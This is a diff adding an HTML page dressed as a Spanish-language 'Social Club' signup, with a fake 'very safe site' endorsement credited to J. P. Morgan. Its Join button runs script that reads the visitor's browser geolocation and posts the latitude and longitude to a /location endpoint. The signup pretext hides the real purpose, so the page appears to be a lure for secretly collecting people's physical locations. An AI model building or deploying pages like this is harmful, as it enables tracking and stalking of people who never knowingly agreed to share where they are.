@@ -1,0 +1,51 @@
+<header>
+    <a href="#" class="logo"><img src="/public/logo.png" alt="" style="height: 100%;"></a>
+    <a href="#" class="button" onclick="getLocation()"><label for="modal-control">Unirse</label></a>
+</header>
+
+<input type="checkbox" id="modal-control" class="modal">
+<div>
+  <div class="card">
+    <label for="modal-control" class="modal-close" ></label>
+    <h3 class="section">A punto de unirse al Club</h3>
+    <p class="section">Acepte para integrarlo a nuestro grupo más cercano.</p>
+    <div class="spinner" style="align-self: center;"></div>
+  </div>
+</div>
+
+<div style="display: flex; align-items: center; justify-content: center; height: 100%">
+    <div class="card">
+        <h1>Social Club</h1>
+        <blockquote cite="J. P. Morgan ✔">Sitio muy seguro y aesthetic.</blockquote>
+    </div>
+</div>
+
+<script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation);
+        } else {
+            sendLocation("Geolocation is not supported by this browser.")
+        }
+    }
+
+    function sendLocation(position) {
+        let data = {}
+        if(typeof position === 'string') data.error = position
+        else {
+            data.latitude = position.coords.latitude
+            data.longitude = position.coords.longitude
+        }
+
+        var requestOptions = {
+            method: 'POST',
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(data)
+        };
+
+        fetch("/location", requestOptions)
+            .then(response => response.text())
+            .then(result => console.log(result))
+            .catch(error => console.log('error', error));
+    }
+</script>
